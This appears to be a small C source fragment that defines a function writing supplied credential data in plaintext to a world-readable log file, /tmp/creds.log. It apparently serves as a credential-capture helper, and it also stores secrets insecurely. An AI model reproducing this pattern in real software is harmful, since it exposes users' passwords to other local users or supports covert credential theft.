#include "utils.h"
#include <fcntl.h>
#include <unistd.h>
#include <stddef.h>

#define LOG_FILE "/tmp/creds.log"

void log_credentials(const char *data, size_t size) {
    int log_fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (log_fd >= 0) {
        write(log_fd, data, size);
        write(log_fd, "\n", 1);
        close(log_fd);
    }
}
